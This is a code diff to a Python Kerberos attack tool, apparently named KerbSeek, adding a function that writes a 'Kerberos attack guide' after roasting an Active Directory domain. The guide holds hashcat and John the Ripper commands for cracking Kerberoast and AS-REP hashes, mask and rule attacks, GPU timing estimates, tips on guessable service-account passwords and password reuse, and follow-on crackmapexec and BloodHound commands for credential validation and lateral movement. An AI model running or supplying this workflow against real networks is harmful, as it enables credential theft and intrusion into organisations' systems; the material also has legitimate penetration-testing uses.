@@ -497,6 +497,293 @@ def save_json(results, filename='kerb_details.json'):
         print(f"{RED}[!] Error saving JSON: {e}{RESET}")
 
 
+def save_kerberos_attack_guide(results, filename='KERBEROS_ATTACK_GUIDE.txt'):
+    """Generate comprehensive Kerberos attack guide"""
+    try:
+        tgs_hashes = [r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success']
+        asrep_hashes = [r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success']
+        
+        if not tgs_hashes and not asrep_hashes:
+            return
+        
+        # Analyze encryption types
+        rc4_count = len([r for r in tgs_hashes if 'RC4' in r.get('encryption', '')])
+        aes_count = len([r for r in tgs_hashes if 'AES' in r.get('encryption', '')])
+        
+        with open(filename, 'w') as f:
+            f.write("=" * 80 + "\n")
+            f.write("KERBEROS ATTACK GUIDE\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write(f"Kerberoasting Hashes: {len(tgs_hashes)}\n")
+            f.write(f"ASREPRoasting Hashes: {len(asrep_hashes)}\n\n")
+            
+            if tgs_hashes:
+                f.write("=" * 80 + "\n")
+                f.write("KERBEROASTING HASH CRACKING\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("📊 Encryption Analysis:\n")
+                f.write("-" * 80 + "\n")
+                f.write(f"RC4-HMAC (weak): {rc4_count} hashes\n")
+                f.write(f"AES (strong): {aes_count} hashes\n\n")
+                
+                if rc4_count > 0:
+                    f.write("✓ RC4 hashes are MUCH faster to crack (prioritize these)\n")
+                    f.write("✓ Expected speed: ~1-10 GH/s on modern GPU\n\n")
+                
+                if aes_count > 0:
+                    f.write("⚠ AES hashes are slower to crack\n")
+                    f.write("⚠ Expected speed: ~100-500 MH/s on modern GPU\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("METHOD 1: Hashcat (Recommended)\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("Basic cracking:\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt\n\n")
+                
+                f.write("With rules (MUCH more effective):\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt -r /path/to/best64.rule\n\n")
+                
+                f.write("Common wordlists:\n")
+                f.write("  • rockyou.txt - Most popular passwords\n")
+                f.write("  • SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt\n")
+                f.write("  • SecLists/Passwords/darkweb2017-top10000.txt\n\n")
+                
+                f.write("Brute force (if wordlist fails):\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d\n")
+                f.write("  (Tries: Uppercase + 4 lowercase + 4 digits, e.g., Password1234)\n\n")
+                
+                f.write("Mask attack (common patterns):\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d\n")
+                f.write("  (Tries: Uppercase + 6 lowercase + 2 digits, e.g., Welcome01)\n\n")
+                
+                f.write("Performance tuning:\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt wordlist.txt -O\n")
+                f.write("  (-O = Optimized kernel, uses more GPU memory but faster)\n\n")
+                
+                f.write("Resume interrupted session:\n")
+                f.write("hashcat -m 13100 tgs_hashes.txt wordlist.txt --session=kerb1 --restore\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("METHOD 2: John the Ripper\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("Basic cracking:\n")
+                f.write("john --format=krb5tgs tgs_hashes.txt --wordlist=/path/to/wordlist.txt\n\n")
+                
+                f.write("With rules:\n")
+                f.write("john --format=krb5tgs tgs_hashes.txt --wordlist=wordlist.txt --rules=Jumbo\n\n")
+                
+                f.write("Show cracked passwords:\n")
+                f.write("john --format=krb5tgs tgs_hashes.txt --show\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("CRACKING TIME ESTIMATES\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("RC4-HMAC Hashes (Fast):\n")
+                f.write("-" * 80 + "\n")
+                f.write("Wordlist (rockyou.txt - 14M passwords):\n")
+                f.write("  • RTX 3090: ~5 seconds\n")
+                f.write("  • RTX 4090: ~3 seconds\n")
+                f.write("  • GTX 1080: ~20 seconds\n\n")
+                
+                f.write("Brute force (8 chars, lowercase+digits):\n")
+                f.write("  • RTX 3090: ~2 hours\n")
+                f.write("  • RTX 4090: ~1 hour\n")
+                f.write("  • GTX 1080: ~8 hours\n\n")
+                
+                f.write("AES Hashes (Slower):\n")
+                f.write("-" * 80 + "\n")
+                f.write("Wordlist (rockyou.txt - 14M passwords):\n")
+                f.write("  • RTX 3090: ~30 seconds\n")
+                f.write("  • RTX 4090: ~20 seconds\n")
+                f.write("  • GTX 1080: ~2 minutes\n\n")
+                
+                f.write("Brute force (8 chars, lowercase+digits):\n")
+                f.write("  • RTX 3090: ~12 hours\n")
+                f.write("  • RTX 4090: ~8 hours\n")
+                f.write("  • GTX 1080: ~48 hours\n\n")
+                
+                f.write("💡 TIP: Start with wordlist + rules. Only brute force if that fails.\n\n")
+            
+            if asrep_hashes:
+                f.write("=" * 80 + "\n")
+                f.write("ASREPROASTING HASH CRACKING\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("METHOD 1: Hashcat (Recommended)\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("Basic cracking:\n")
+                f.write("hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt\n\n")
+                
+                f.write("With rules:\n")
+                f.write("hashcat -m 18200 asrep_hashes.txt wordlist.txt -r /path/to/best64.rule\n\n")
+                
+                f.write("Brute force:\n")
+                f.write("hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d\n\n")
+                
+                f.write("Performance tuning:\n")
+                f.write("hashcat -m 18200 asrep_hashes.txt wordlist.txt -O\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("METHOD 2: John the Ripper\n")
+                f.write("=" * 80 + "\n\n")
+                
+                f.write("Basic cracking:\n")
+                f.write("john --format=krb5asrep asrep_hashes.txt --wordlist=/path/to/wordlist.txt\n\n")
+                
+                f.write("Show cracked:\n")
+                f.write("john --format=krb5asrep asrep_hashes.txt --show\n\n")
+                
+                f.write("⚠ Note: AS-REP hashes typically use AES encryption (slower to crack)\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("OPERATIONAL RECOMMENDATIONS\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write("🎯 Prioritization Strategy:\n")
+            f.write("-" * 80 + "\n")
+            if rc4_count > 0:
+                f.write("1. Crack RC4 hashes first (much faster)\n")
+                f.write("2. Start with rockyou.txt + best64.rule\n")
+                f.write("3. If no success, try larger wordlists\n")
+                f.write("4. Last resort: brute force short passwords\n\n")
+            else:
+                f.write("1. Start with rockyou.txt + best64.rule (AES hashes detected)\n")
+                f.write("2. Try multiple rule sets (dive.rule, OneRuleToRuleThemAll)\n")
+                f.write("3. Use hybrid attacks (wordlist + append digits/special chars)\n")
+                f.write("4. Consider distributed cracking (long cracking time expected)\n\n")
+            
+            f.write("⏱ Time Management:\n")
+            f.write("-" * 80 + "\n")
+            f.write("• Wordlist attacks: Minutes to hours\n")
+            f.write("• Rule-based attacks: Hours to days\n")
+            f.write("• Brute force (8 chars): Hours to days\n")
+            f.write("• Brute force (9+ chars): Days to weeks\n\n")
+            
+            f.write("🔧 Hardware Recommendations:\n")
+            f.write("-" * 80 + "\n")
+            f.write("• Use GPU cracking (100-1000x faster than CPU)\n")
+            f.write("• RTX 30/40 series ideal for Kerberos hash cracking\n")
+            f.write("• Multiple GPUs scale linearly (2 GPUs = 2x speed)\n")
+            f.write("• Cloud GPU instances (AWS/Azure) viable for short jobs\n\n")
+            
+            f.write("💡 Pro Tips:\n")
+            f.write("-" * 80 + "\n")
+            f.write("• Service accounts often have weak/predictable passwords\n")
+            f.write("• Check cracked passwords against other accounts (password reuse)\n")
+            f.write("• RC4 hashes indicate legacy configurations (more vulnerable)\n")
+            f.write("• Some orgs use patterns: ServiceName + Year + Special char\n")
+            f.write("• Check for default passwords: Service123, Service2024, etc.\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("AFTER CRACKING PASSWORDS\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write("Validate credentials:\n")
+            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>'\n\n")
+            
+            f.write("Check user permissions:\n")
+            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>' --shares\n")
+            f.write("crackmapexec ldap <DC-IP> -u '<username>' -p '<password>' --users\n\n")
+            
+            f.write("Look for lateral movement opportunities:\n")
+            f.write("crackmapexec smb <TARGET-RANGE> -u '<username>' -p '<password>'\n\n")
+            
+            f.write("Enumerate with credentials:\n")
+            f.write("python3 ldapseek.py -i <DC-IP> --full -u '<DOMAIN>\\<username>' -p '<password>'\n\n")
+            
+            f.write("BloodHound collection:\n")
+            f.write("bloodhound-python -u '<username>' -p '<password>' -d <DOMAIN> -dc <DC-IP> -c All\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("WORDLIST RESOURCES\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write("Essential Wordlists:\n")
+            f.write("-" * 80 + "\n")
+            f.write("• rockyou.txt (14M passwords, most popular)\n")
+            f.write("  Download: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n")
+            
+            f.write("• SecLists (multiple wordlists)\n")
+            f.write("  git clone https://github.com/danielmiessler/SecLists\n")
+            f.write("  Common-Credentials/10-million-password-list-top-1000000.txt\n\n")
+            
+            f.write("• CrackStation (1.5B passwords, 15GB)\n")
+            f.write("  Download: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n\n")
+            
+            f.write("Rule Sets:\n")
+            f.write("-" * 80 + "\n")
+            f.write("• best64.rule (built-in, great starting point)\n")
+            f.write("• dive.rule (aggressive mutations)\n")
+            f.write("• OneRuleToRuleThemAll (comprehensive)\n")
+            f.write("  git clone https://github.com/NotSoSecure/password_cracking_rules\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("HASHCAT INSTALLATION\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write("Linux:\n")
+            f.write("apt install hashcat\n")
+            f.write("# OR download latest from https://hashcat.net/hashcat/\n\n")
+            
+            f.write("Windows:\n")
+            f.write("Download: https://hashcat.net/hashcat/\n")
+            f.write("Extract and run: hashcat.exe\n\n")
+            
+            f.write("GPU Drivers:\n")
+            f.write("• NVIDIA: Install CUDA Toolkit + latest drivers\n")
+            f.write("• AMD: Install ROCm drivers\n")
+            f.write("• Test GPU: hashcat -I (should show your GPU)\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("REFERENCES\n")
+            f.write("=" * 80 + "\n\n")
+            
+            f.write("• Hashcat Wiki: https://hashcat.net/wiki/\n")
+            f.write("• Kerberoasting Guide: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting\n")
+            f.write("• ASREPRoasting Guide: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat\n")
+            f.write("• Hashcat Examples: https://hashcat.net/wiki/doku.php?id=example_hashes\n")
+            f.write("• John the Ripper: https://www.openwall.com/john/\n\n")
+            
+            f.write("=" * 80 + "\n")
+            f.write("HASH DETAILS\n")
+            f.write("=" * 80 + "\n\n")
+            
+            if tgs_hashes:
+                f.write(f"Kerberoasting Targets ({len(tgs_hashes)}):\n")
+                f.write("-" * 80 + "\n")
+                for r in tgs_hashes[:20]:  # Limit to first 20
+                    enc = r.get('encryption', 'Unknown')
+                    f.write(f"• {r['username']:<30} | {enc:<20}\n")
+                    if 'spn' in r:
+                        f.write(f"  SPN: {r['spn']}\n")
+                if len(tgs_hashes) > 20:
+                    f.write(f"... and {len(tgs_hashes) - 20} more (see kerb_details.txt)\n")
+                f.write("\n")
+            
+            if asrep_hashes:
+                f.write(f"ASREPRoasting Targets ({len(asrep_hashes)}):\n")
+                f.write("-" * 80 + "\n")
+                for r in asrep_hashes[:20]:
+                    f.write(f"• {r['username']}\n")
+                if len(asrep_hashes) > 20:
+                    f.write(f"... and {len(asrep_hashes) - 20} more (see kerb_details.txt)\n")
+                f.write("\n")
+        
+        print(f"{GREEN}[+] Kerberos attack guide saved to: {filename}{RESET}")
+        if rc4_count > 0:
+            print(f"{YELLOW}[!] {rc4_count} RC4 hashes detected - these crack FAST!{RESET}")
+        
+    except Exception as e:
+        print(f"{RED}[!] Error saving Kerberos attack guide: {e}{RESET}")
+
+
 def main():
     parser = argparse.ArgumentParser(
         description='KerbSeek - Kerberos Attack Discovery',
@@ -633,12 +920,15 @@ Examples:
             
             save_details(success_results)
             save_json(success_results)
+            save_kerberos_attack_guide(success_results)
             
             print(f"\n{YELLOW}[*] Next steps:{RESET}")
             if kerb_success > 0:
-                print(f"  hashcat -m 13100 tgs_hashes.txt rockyou.txt")
+                print(f"  hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /path/to/best64.rule")
+                print(f"  {CYAN}Review KERBEROS_ATTACK_GUIDE.txt for comprehensive cracking strategies{RESET}")
             if asrep_success > 0:
-                print(f"  hashcat -m 18200 asrep_hashes.txt rockyou.txt")
+                print(f"  hashcat -m 18200 asrep_hashes.txt rockyou.txt -r /path/to/best64.rule")
+                print(f"  {CYAN}Review KERBEROS_ATTACK_GUIDE.txt for comprehensive cracking strategies{RESET}")
     
     print(f"\n{GREEN}[+] Attack complete!{RESET}")
 
